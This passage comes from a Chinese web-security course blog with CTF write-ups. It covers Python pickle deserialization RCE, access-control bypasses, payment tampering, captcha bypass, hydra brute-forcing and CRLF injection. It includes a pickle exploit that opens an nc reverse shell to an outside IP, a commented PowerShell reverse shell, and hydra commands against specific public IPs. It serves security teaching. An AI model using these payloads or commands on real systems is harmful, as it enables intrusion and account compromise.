A()</span><br><span class="line">p_a = pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;==========&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(p_a)</span><br><span class="line">反序列化时自动调用__getstate__()</span><br></pre></td></tr></table></figure>

<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#反序列化安全漏洞产生-DEMO</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, func, arg</span>):</span><br><span class="line">        self.func = func</span><br><span class="line">        self.arg = arg</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;This is A&#x27;</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;反序列化调用&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> (self.func, self.arg)</span><br><span class="line">a = A(os.system, (<span class="string">&#x27;calc&#x27;</span>,))</span><br><span class="line">p_a = pickle.dumps(a)</span><br><span class="line">pickle.loads(p_a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;==========&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(p_a)</span><br><span class="line">pickle.loads(p_a) 反序列化该二进制字符串，并触发其中包含的 __reduce__() 方法。</span><br><span class="line">由于该方法中包含了 self.func(*self.arg) 语句，因此在执行反序列化操作时，</span><br><span class="line">Python 解释器会自动调用 os.system(<span class="string">&#x27;calc&#x27;</span>) 函数，并弹出计算器应用程序。</span><br></pre></td></tr></table></figure>

<p>python反序列化不同于PHP的一点时，构造利用链时不需要网站源码含有能被自动调用的魔术方法，<br>只需要在构造利用链的时候自己调用利用链中的魔术方法即可，也就说python源码中只有要pickle.load()反序列化函数即可利用</p>
<h4 id="CTF-反序列化漏洞利用构造-RCE"><a href="#CTF-反序列化漏洞利用构造-RCE" class="headerlink" title="#CTF-反序列化漏洞利用构造&amp;RCE"></a>#CTF-反序列化漏洞利用构造&amp;RCE</h4><p>环境介绍：利用Python-ask搭建的web应用，获取当前用户的信息，进行展示，在获取用<br>户的信息时，通过对用户数据进行反序列化获取导致的安全漏洞！<br>思路：通过分析网站源代码可知，用过接收cookie中user参数的值，然后将值拼接到HELLOW 之后显示，<br>那么我们只需要构造利用链传参到cookie中user字段，即可利用<br>Server服务器：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        user = base64.b64decode(request.cookies.get(<span class="string">&#x27;user&#x27;</span>))</span><br><span class="line">        user = pickle.loads(user)</span><br><span class="line">        username = user[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        username = <span class="string">&quot;Guest&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Hello %s&quot;</span> % username</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(</span><br><span class="line">        host=<span class="string">&#x27;192.168.1.3&#x27;</span>,</span><br><span class="line">        port=<span class="number">5000</span>,</span><br><span class="line">        debug=<span class="literal">True</span></span><br><span class="line">    )</span><br></pre></td></tr></table></figure>

<p>hack-flag.py：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">exp</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment">#s = &quot;&quot;&quot;powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(&quot;192.168.46.137&quot;,6666); = .GetStream();[byte[]] = 0..65535|%&#123;0&#125;;while(( = .Read(, 0, .Length)) -ne 0)&#123;; = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(,0, ); = (iex  2&gt;&amp;1 | Out-String );  =  + &quot;PS &quot; + (pwd).Path + &quot;&gt; &quot;; = ([text.encoding]::ASCII).GetBytes();.Write(,0,.Length);.Flush()&#125;;.Close()&quot;&quot;&quot;</span></span><br><span class="line">        s=<span class="string">&#x27;c:/nc -e cmd 192.168.46.137 6666&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system, (s,))</span><br><span class="line">e = exp()</span><br><span class="line">s = pickle.dumps(e)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"></span><br><span class="line">response = requests.get(<span class="string">&quot;http://192.168.1.3:5000/&quot;</span>, cookies=<span class="built_in">dict</span>(</span><br><span class="line">    user=base64.b64encode(s).decode()</span><br><span class="line">))</span><br><span class="line"><span class="built_in">print</span>(response.content)</span><br></pre></td></tr></table></figure>

<h4 id="CTF-华北JWT-反序列化"><a href="#CTF-华北JWT-反序列化" class="headerlink" title="#CTF-华北JWT&amp;反序列化"></a><strong>#CTF-华北JWT&amp;反序列化</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">通过提示-&gt;寻找lV6-&gt;购买修改支付逻辑-&gt;绕过admin限制需修改jwt值&gt;爆被jwt密匙&gt;重组</span><br><span class="line">jwt值成为admin-&gt;购买进入会员中心-&gt;源码找到文件压缩源码-&gt;Python代码审计反序列化</span><br><span class="line">&gt;构适读取f1ag代码进行序列化打印-&gt;提交获取</span><br><span class="line">考点1:JWT身份验证攻击点：</span><br><span class="line">https://www.cnblogs.com/vege/p/14468030.html</span><br><span class="line">https://github.com/ck00004/c-jwt-cracker</span><br><span class="line">考点2:Pth0n代码审计反序列化：</span><br><span class="line">自动工具：https://github.com/PyCQA/bandit</span><br><span class="line">参考资料：https://github.com/bit4woo/python_sec</span><br></pre></td></tr></table></figure>

<p>思路：根据网站提示找到lv6–使用爬虫爬取lv6</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,time</span><br><span class="line">url=<span class="string">&quot;http://45bc846d-ca58-49a6-812d-de90e99f548d.node5.buuoj.cn:81/shop?page=&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">2000</span>):</span><br><span class="line">    time.sleep(<span class="number">0.2</span>)</span><br><span class="line">    r=requests.get(url+<span class="built_in">str</span>(i))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;lv6.png&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(i)+<span class="string">&#x27;|no&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><strong>绕过admin限制试图修改jwt值，但是需要对密钥进行爆破–使用工具爆破后获得密钥IKun–构造admin jwt值</strong></p>
<p>页面并无其他内容，点击也无反应–查看js代码–含有网站源代码下载</p>
<p>进行代码审计–全局查找pickle.load()函数–找到反序列化位置，构造利用链</p>
<h4 id="代码审计-自动化工具band安装及使用"><a href="#代码审计-自动化工具band安装及使用" class="headerlink" title="#代码审计-自动化工具band安装及使用"></a>#代码审计-自动化工具band安装及使用</h4><p>参考：<a target="_blank" rel="noopener" href="https://bandit.readthedocs.lo/">https://bandit.readthedocs.lo/</a><br>安装：pip install bandit<br>linux：<br>安装后会在当前Python目录下6in<br>使用：bandit-r需要审计的源码目录<br>windows：<br>安装后会在当前Python目录下script<br>使用：bandit-r需要审计的源码目录</p>
<h1 id="第49天：WEB攻防-通用漏洞-业务逻辑-水平垂直越权-访问控制-脆弱验证"><a href="#第49天：WEB攻防-通用漏洞-业务逻辑-水平垂直越权-访问控制-脆弱验证" class="headerlink" title="第49天：WEB攻防-通用漏洞&amp;业务逻辑&amp;水平垂直越权&amp;访问控制&amp;脆弱验证"></a>第49天：WEB攻防-通用漏洞&amp;业务逻辑&amp;水平垂直越权&amp;访问控制&amp;脆弱验证</h1><h4 id="知识点：-29"><a href="#知识点：-29" class="headerlink" title="知识点："></a>知识点：</h4><p>1、水平越权同级用户权限共享<br>2、垂直越权-低高用户权限共享<br>3、访问控制-验证丢失&amp;取消验证<br>4、脆弱验证-Cookie&amp;Token&amp;Jwt等</p>
<h4 id="前置知识：-2"><a href="#前置知识：-2" class="headerlink" title="#前置知识："></a>#前置知识：</h4><p>1、逻辑越权原理<br>水平越权：用户信息获取时未对用户与D比较判断直接查间等<br>垂直越权：数摆库中用户类型编号接受缥改或高权限操作未验证等<br>2、访问控制原理<br>验证丢失：未包含引用验证代码文件等<br>取消验证：支持空口令，匿名白名单等<br>3、脆弱验证原理<br>-Cookie&amp;Token&amp;JwM:不安全的验证迈指等</p>
<h4 id="演示案例：-26"><a href="#演示案例：-26" class="headerlink" title="演示案例："></a>演示案例：</h4><p>权限-水平越权YXCMS-检测数据比对弱<br>权限-垂直越权-MINICMS-权限操作无验证<br>未授权-访问控制-XHCMS-代码未引用验证<br>未授权-脆弱机制-XHCMS-Cookie脆弱验证<br>弱机制-空口令机制-Redis&amp;Weblogics弱机制<br>检测类-工具项目-Authz&amp;Secscan-Authcheck</p>
<h4 id="权限-水平越权-YXCMS检溪数据比对弱"><a href="#权限-水平越权-YXCMS检溪数据比对弱" class="headerlink" title="#权限-水平越权-YXCMS检溪数据比对弱"></a><strong>#权限-水平越权-YXCMS检溪数据比对弱</strong></h4><p>只检测用户和ID对应关系，没检测当前操作用户是不是当前用户<br>思路：通过抓取对某一用户修改资料数据包进行修改–修改为其他用户且变更资料来实现</p>
<h4 id="权限-垂直越权MINICMS权限操作无验证"><a href="#权限-垂直越权MINICMS权限操作无验证" class="headerlink" title="#权限-垂直越权MINICMS权限操作无验证"></a><strong>#权限-垂直越权MINICMS权限操作无验证</strong></h4><p>后台数据包访问先执行后判断登录等于无效</p>
<h4 id="未授权-脆弱机制-XHCMS-Cookie脆弱验证"><a href="#未授权-脆弱机制-XHCMS-Cookie脆弱验证" class="headerlink" title="#未授权-脆弱机制-XHCMS-Cookie脆弱验证"></a>#<strong>未授权-脆弱机制-XHCMS-Cookie脆弱验证</strong></h4><p>修改数据包中cookie字段信息，构造user等于任意字段直接登录到后台。</p>
<h4 id="弱机制-空口令机制-Redis-Weblogics弱机制"><a href="#弱机制-空口令机制-Redis-Weblogics弱机制" class="headerlink" title="#弱机制-空口令机制-Redis&amp;Weblogics弱机制"></a>#<strong>弱机制-空口令机制-Redis&amp;Weblogics弱机制</strong></h4><p>redis直接使用redis-cli.exe连接<br>wenlogic访问特定url</p>
<h4 id="检测类-工具项目-Authz-Secscan-Authcheck"><a href="#检测类-工具项目-Authz-Secscan-Authcheck" class="headerlink" title="#检测类-工具项目-Authz&amp;Secscan-Authcheck"></a>#检测类-工具项目-Authz&amp;Secscan-Authcheck</h4><p>安装踩坑：<a target="_blank" rel="noopener" href="https://bigyoung.cn/posts/250/">https://bigyoung.cn/posts/250/</a><br><a target="_blank" rel="noopener" href="https://github.com/ztosec/secscan-authcheck">https://github.com/ztosec/secscan-authcheck</a>     越权检测工具</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44203158/article/details/110007233">https://blog.csdn.net/weixin_44203158/article/details/110007233</a></p>
<h1 id="第50天：WEB攻防-通用漏洞-购买支付逻辑-数据篡改-请求重放-接口替换"><a href="#第50天：WEB攻防-通用漏洞-购买支付逻辑-数据篡改-请求重放-接口替换" class="headerlink" title="第50天：WEB攻防-通用漏洞&amp;购买支付逻辑&amp;数据篡改&amp;请求重放&amp;接口替换"></a>第50天：WEB攻防-通用漏洞&amp;购买支付逻辑&amp;数据篡改&amp;请求重放&amp;接口替换</h1><h4 id="知识点：-30"><a href="#知识点：-30" class="headerlink" title="知识点："></a>知识点：</h4><p>1、商品购买数量&amp;价格&amp;编号等<br>2、支付模式状态&amp;接口&amp;负数等<br>3、折扣处理-优患券&amp;积分&amp;重放等</p>
<h4 id="详细点：-10"><a href="#详细点：-10" class="headerlink" title="#详细点："></a>#详细点：</h4><p>1、熟悉常见支付流程<br>选择商品和数量选择译支付及配送方式生成订单编号订单支付选择完成支付<br>2、熟悉那些数据算改<br>商品编号引D,购买价格，购买数量，支付方式，订单号，支付状态等<br>3、熟悉那些修改方式<br>替换支付，重复支付，最小额支付，负数支付，溢出支付，优患券支付等</p>
<h4 id="章节内容："><a href="#章节内容：" class="headerlink" title="#章节内容："></a>#章节内容：</h4><p>1、权限相关越权&amp;访问控制&amp;未授权访问等<br>2、购买支付数据算改&amp;支付模式&amp;其他折扣等<br>3、下节课<br>4、下节课</p>
<h4 id="演示案例：-27"><a href="#演示案例：-27" class="headerlink" title="演示案例："></a>演示案例：</h4><p> 数据篡改-价格&amp;数量&amp;产品</p>
<p> 修改方式-订单号&amp;数量&amp;优惠券</p>
<p> 某实例-演示站交易支付逻辑安全</p>
<p> 代码审计-业务支付逻辑&amp;安全修复</p>
<h4 id="数据篡改-价格-数量-产品"><a href="#数据篡改-价格-数量-产品" class="headerlink" title="#数据篡改-价格&amp;数量&amp;产品"></a>#数据篡改-价格&amp;数量&amp;产品</h4><p>1、修改数量达到价格变动</p>
<p>因为没有把这些参数固定死，导致出现的安全问题</p>
<p>2、修改单价达到价格变动</p>
<p>3、修改产品达到低价购买（A产品5400 B产品6000,通过将A产品数据包中除价格外内容修改为B产品）</p>
<p>当不能对数量和价格做修改的时候的另一种做法。</p>
<p>4、修改接口达到成功购买</p>
<blockquote>
<p>修改支付接口，抓包可以看到这一系列参数就是代表的支付宝接口，如果说你把这个改成你自己的支付接口的话，就像行当与你把钱付给自己。然后支付状态也没问题的话，对方就会认为成功支付了。但是这个支付接口是比较难申请的，因为关联一些洗钱相关的黑色产业，所以抓的比较紧，并且也是违法行为。这里不做演示，知道有这个东西就好。</p>
<p>这是一个攻击点，但防御也很简单，就是对方不认你这个接口，它直接在源码中写清楚只接受自己的接口，所以就算你改成功了，并且也付款成功了。对方那里就会显示购买失败。</p>
</blockquote>
<h4 id="修改方式-订单号-数量-优惠券"><a href="#修改方式-订单号-数量-优惠券" class="headerlink" title="#修改方式-订单号&amp;数量&amp;优惠券"></a>#修改方式-订单号&amp;数量&amp;优惠券</h4><p>1、修改数量达到价格变动（数量修改为0.001）</p>
<p>2、修改订单达到底价购买（修改订单编号，比如有100和1000000的两个单，修改编号使用100去购买1000000的单）</p>
<p>3、优惠券重放使用&amp;重领使用</p>
<h4 id="某实例-演示站交易支付逻辑安全"><a href="#某实例-演示站交易支付逻辑安全" class="headerlink" title="#某实例-演示站交易支付逻辑安全"></a>#某实例-演示站交易支付逻辑安全</h4><p>奇乐中介–修改订单金额</p>
<h4 id="代码审计-业务支付逻辑-安全修复"><a href="#代码审计-业务支付逻辑-安全修复" class="headerlink" title="#代码审计-业务支付逻辑&amp;安全修复"></a>#代码审计-业务支付逻辑&amp;安全修复</h4><p>1、金额以数据库定义为准</p>
<p>2、购买数量限制为正整数</p>
<p>3、优惠券固定使用后删除</p>
<p>4、订单生成后检测对应值</p>
<h1 id="第51天：WEB攻防-通用漏洞-验证码识别-复用-调用-找回密码重定向-状态值"><a href="#第51天：WEB攻防-通用漏洞-验证码识别-复用-调用-找回密码重定向-状态值" class="headerlink" title="第51天：WEB攻防-通用漏洞&amp;验证码识别&amp;复用&amp;调用&amp;找回密码重定向&amp;状态值"></a>第51天：WEB攻防-通用漏洞&amp;验证码识别&amp;复用&amp;调用&amp;找回密码重定向&amp;状态值</h1><h4 id="知识点：-31"><a href="#知识点：-31" class="headerlink" title="#知识点："></a>#知识点：</h4><p>1、找回密码逻辑机制-回显&amp;验证码&amp;指向</p>
<p>2、验证码验证安全机制-爆破&amp;复用&amp;识别</p>
<p>3、找回密码-客户端回显&amp;Response 状态值&amp;修改重定向</p>
<p>4、验证码技术-验证码爆破，验证码复用，验证码识别等</p>
<h4 id="详细点：-11"><a href="#详细点：-11" class="headerlink" title="#详细点："></a>#详细点：</h4><p>-找回密码流程安全：</p>
<p>1、用回显状态判断-res 前端判断不安全</p>
<p>2、用用户名重定向-修改标示绕过验证</p>
<p>3、验证码回显显示-验证码泄漏验证虚设</p>
<p>4、验证码简单机制-验证码过于简单爆破</p>
<p>-验证码绕过安全：</p>
<p>1、验证码简单机制-验证码过于简单爆破</p>
<p>2、验证码重复使用-验证码验证机制绕过</p>
<p>3、验证码智能识别-验证码图形码被识别</p>
<p>4、验证码接口调用-验证码触发机制枚举</p>
<h4 id="安全修复方案："><a href="#安全修复方案：" class="headerlink" title="#安全修复方案："></a>#安全修复方案：</h4><p>-找回机制要进行每一步验证-防绕过重定向</p>
<p>-找回机制要进行服务端验证-防 res 数据修改</p>
<p>-找回机制要控制验证码安全-防验证码攻击</p>
<p>-验证码接口需验证后被调用-防接口被乱调用</p>
<p>-验证码引用智能化人工判断-防验证码被识别</p>
<p>-验证码采用时间段生效失效-防验证码被复用</p>
<h4 id="演示案例：-28"><a href="#演示案例：-28" class="headerlink" title="演示案例："></a>演示案例：</h4><p>phpun-res 值修改&amp;验证码回显&amp;爆破</p>
<p>某 APP-res 值修改&amp;验证码接口调用&amp;复用</p>
<p>seacms-验证码识别&amp;找回机制对应值修改</p>
<h4 id="phpun-res-值修改-验证码回显-爆破"><a href="#phpun-res-值修改-验证码回显-爆破" class="headerlink" title="#phpun-res 值修改&amp;验证码回显&amp;爆破"></a>#phpun-res 值修改&amp;验证码回显&amp;爆破</h4><p>1、验证码回显绑定手机号时验证码前端泄漏被获取<br>在提交验证码时，请求包中含有正确的验证码，<br>此时只需要把提交表单中的验证码改为正确的即可绕过。</p>
<p>2、res修改-绑定手机号时修改返回状态值判定通过<br>将浏览器返回给浏览器的数据抓包（通过burp response this request）发现验证正确的数据包返回值为1，验证错误的数据包返回值为3，所以修改返回值为1即可绕过</p>
<p>3、验证码爆破知道验证码规矩进行无次数限制爆破（建立在验证码没错误次数限制的基础上）<br>使用brup自带的爆破模块（不实用）</p>
<h4 id="某-APP-res-值修改-验证码接口调用-复用"><a href="#某-APP-res-值修改-验证码接口调用-复用" class="headerlink" title="#某 APP-res 值修改&amp;验证码接口调用&amp;复用"></a>#某 APP-res 值修改&amp;验证码接口调用&amp;复用</h4><p>res 修改-找回密码修改返回状态值判定验证通过</p>
<p>验证码接口调用-抓当前发送验证码数据包后调用</p>
<p>思路：先尝试发送验证码验证请求包–抓包并未看到正确验证码存在–尝试抓取验证正确返回包和验证错误返回包，然后将错误返回包内容替换为正确表单值–成功绕过</p>
<p>验证码复用-抓第一次验证通过的验证码进行复用</p>
<h4 id="seacms-验证码识别-找回机制对应值修改"><a href="#seacms-验证码识别-找回机制对应值修改" class="headerlink" title="#seacms-验证码识别&amp;找回机制对应值修改"></a>#seacms-验证码识别&amp;找回机制对应值修改</h4><p>-找回机制对应值修改：</p>
<p>注册两个帐号，尝试找回密码，重置连接重定向绕过</p>
<p>代码审计后分析 Poc：</p>
<p>member.php?mod&#x3D;repsw3&amp;repswcode&#x3D;y&amp;repswname&#x3D;targetUser</p>
<p>-验证码识别：xp_CAPTCHA</p>
<p><a target="_blank" rel="noopener" href="https://github.com/c0ny1/captcha-killer">https://github.com/c0ny1/captcha-killer</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/smxiazi/NEW_xp_CAPTCHA">https://github.com/smxiazi/NEW_xp_CAPTCHA</a></p>
<p>使用环境：windows 10 python3.6.5</p>
<p>安装使用：具体看直播操作</p>
<p>1、burp 安装 jypython 后导入 py 文件</p>
<p>2、安装所需库后 python 运行 server.py</p>
<p>3、抓操作数据包后设置参数设置引用</p>
<p>参考案例：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/punished/p/14746970.html">https://www.cnblogs.com/punished/p/14746970.html</a></p>
<p>应用：爆破密码时，接口调用时，测试其他时等</p>
<p>验证码识别详见文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46343633/article/details/128378686">Brup+Captcha-killer+ddddocr实现验证码识别</a></p>
<h1 id="第52天：WEB攻防-通用漏洞-弱口令安全-社工字典生成-服务协议-Web应用"><a href="#第52天：WEB攻防-通用漏洞-弱口令安全-社工字典生成-服务协议-Web应用" class="headerlink" title="第52天：WEB攻防-通用漏洞&amp;弱口令安全&amp;社工字典生成&amp;服务协议&amp;Web应用"></a>第52天：WEB攻防-通用漏洞&amp;弱口令安全&amp;社工字典生成&amp;服务协议&amp;Web应用</h1><h4 id="知识点：-32"><a href="#知识点：-32" class="headerlink" title="#知识点："></a>#知识点：</h4><p>1、弱口令安全&amp;配置&amp;初始化等</p>
<p>2、弱口令对象&amp;Web&amp;服务&amp;应用等</p>
<p>3、弱口令字典&amp;查询&amp;列表&amp;列表等</p>
<h4 id="前置知识：-3"><a href="#前置知识：-3" class="headerlink" title="#前置知识："></a>#前置知识：</h4><p>弱口令(weak password) 没有严格和准确的定义，通常认为容易被别人（他们有可能</p>
<p>对你很了解）猜测到或被破解工具破解的口令均为弱口令，通常与管理的安全意识和平台</p>
<p>的初始化配置等相关，通过系统弱口令，可被黑客直接获得系统控制权限。</p>
<p>在常见的安全测试中，弱口令会产生安全的各个领域，包括 Web 应用，安全设备，平台</p>
<p>组件，操作系统等；如何获取弱口令，利用弱口令成为了此类安全问题的关键！</p>
<h4 id="演示案例：-29"><a href="#演示案例：-29" class="headerlink" title="演示案例："></a>演示案例：</h4><p> Web 类-加密&amp;验证码后台猜解</p>
<p> 服务类-SSH&amp;RDP 远程终端猜解</p>
<p> 应用类-ZIP&amp;Word 文件压缩包猜解</p>
<p> 字典类-密文收集&amp;弱口令&amp;自定义生成</p>
<h4 id="Web-类-加密-验证码后台猜解"><a href="#Web-类-加密-验证码后台猜解" class="headerlink" title="#Web 类-加密&amp;验证码后台猜解"></a>#Web 类-加密&amp;验证码后台猜解</h4><p><a target="_blank" rel="noopener" href="https://github.com/smxiazi/NEW_xp_CAPTCHA">https://github.com/smxiazi/NEW_xp_CAPTCHA</a></p>
<p>-Zblog-密文 MD5 传输加密猜解</p>
<p>Seacms-登录验证码识别猜解（识别验证码识别工具绕过验证码认证）</p>
<h4 id="服务类–SSH-RDP远程终端猜解"><a href="#服务类–SSH-RDP远程终端猜解" class="headerlink" title="#服务类–SSH&amp;RDP远程终端猜解"></a><strong>#服务类–SSH&amp;RDP远程终端猜解</strong></h4><p><a target="_blank" rel="noopener" href="https://github.com/vanhauser-thc/thc-hydra">https://github.com/vanhauser-thc/thc-hydra</a><br>hydra是一个自动化的爆破工具，暴力破解弱密码<br>是一个支持众多协议的爆破工具，已经集成到KaliLinux中，直接在终端打开即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">-s PORT可通过这个参数指定非默认端口，</span><br><span class="line">-i LOGN指定破解的用户，对特定用户破解。</span><br><span class="line">-L FILE指定用户名字典。</span><br><span class="line">-p PASS小写，指定密码破解，少用，一股是采用密码序典。</span><br><span class="line">-P FILE大写，指定密码字典。</span><br><span class="line">-e ns可选选项，n:空密码试探，s:使用指定用户和密码试探。</span><br><span class="line">-C FILE使用冒号分割格式，例如“登录名：密码&quot;来代蕾LU-P参数。</span><br><span class="line">-M FILE指定目标列表文件一行一条。</span><br><span class="line">-o FILE指定结果输出文件。</span><br><span class="line">-f 在使用-M参数以后，找到第一对登录名或者密码的时候中止破解。</span><br><span class="line">-t  TASKS同时运行的线程数，默认为16.</span><br><span class="line">-w TIME设置最大超时的时间，单位秒，默认是30s.</span><br><span class="line">-v /-V显示详细过程。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hydra -I root -P UserPassCombo-Jay.txt -t 5-WV 47.110.73.12 ssh -f</span><br><span class="line">hydra -I administrator-P UserPassCombo-Jay.txt -t 5-WV 47.99.218.105 rdp -f</span><br></pre></td></tr></table></figure>

<h4 id="应用类-ZIP-WORD文件压缩包猜解"><a href="#应用类-ZIP-WORD文件压缩包猜解" class="headerlink" title="#应用类-ZIP&amp;WORD文件压缩包猜解"></a><strong>#应用类-ZIP&amp;WORD文件压缩包猜解</strong></h4><p>PassFab for Word<br>Advanced Archive Password Recovery</p>
<h4 id="字典类密文收美-弱口令-自定义生成"><a href="#字典类密文收美-弱口令-自定义生成" class="headerlink" title="#字典类密文收美&amp;弱口令&amp;自定义生成"></a>#字典类密文收美&amp;弱口令&amp;自定义生成</h4><p><a target="_blank" rel="noopener" href="https://monitor.firefox.com/">https://monitor.firefox.com</a><br><a target="_blank" rel="noopener" href="https://haveibeenpwned.com/">https://haveibeenpwned.com</a><br><a target="_blank" rel="noopener" href="https://www.bugku.com/mima">https://www.bugku.com/mima</a><br><a target="_blank" rel="noopener" href="https://github.com/danielmiessler/SecLists%EF%BC%88%E8%BF%91%E5%87%A0%E5%B9%B4%E5%AF%86%E7%A0%81%E4%B9%A0%E6%83%AF%EF%BC%89">https://github.com/danielmiessler/SecLists（近几年密码习惯）</a><br><a target="_blank" rel="noopener" href="https://github.com/hetianlab/DefaultCreds-cheat-sheet%EF%BC%88%E5%B8%B8%E8%A7%81%E8%AE%BE%E5%A4%87%E5%AF%86%E7%A0%81%EF%BC%89">https://github.com/hetianlab/DefaultCreds-cheat-sheet（常见设备密码）</a></p>
<h1 id="第53天：WEB攻防-通用漏洞-CRLF注入-URL重定向-资源处理拒绝服务"><a href="#第53天：WEB攻防-通用漏洞-CRLF注入-URL重定向-资源处理拒绝服务" class="headerlink" title="第53天：WEB攻防-通用漏洞&amp;CRLF注入&amp;URL重定向&amp;资源处理拒绝服务"></a>第53天：WEB攻防-通用漏洞&amp;CRLF注入&amp;URL重定向&amp;资源处理拒绝服务</h1><h4 id="知识点：-33"><a href="#知识点：-33" class="headerlink" title="#知识点："></a>#知识点：</h4><p>1、CRLF 注入-原理&amp;检测&amp;利用</p>
<p>2、URL 重定向-原理&amp;检测&amp;利用</p>
<p>3、Web 拒绝服务-原理&amp;检测&amp;利用</p>
<h4 id="下节预告："><a href="#下节预告：" class="headerlink" title="#下节预告："></a>#下节预告：</h4><p>1、JSONP&amp;CORS 跨域</p>
<p>2、域名安全-接管劫持</p>
<h4 id="详细点：-12"><a href="#详细点：-12" class="headerlink" title="#详细点："></a>#详细点：</h4><h6 id="1-CRLF-注入漏洞，是因为-Web-应用没有对用户输入做严格验证，导致攻击者可以输入一"><a href="#1-CRLF-注入漏洞，是因为-Web-应用没有对用户输入做严格验证，导致攻击者可以输入一" class="headerlink" title="1.CRLF 注入漏洞，是因为 Web 应用没有对用户输入做严格验证，导致攻击者可以输入一"></a>1.CRLF 注入漏洞，是因为 Web 应用没有对用户输入做严格验证，导致攻击者可以输入一</h6><p>些恶意字符。攻击者一旦向请求行或首部中的字段注入恶意的 CRLF，就能注入一些首部</p>
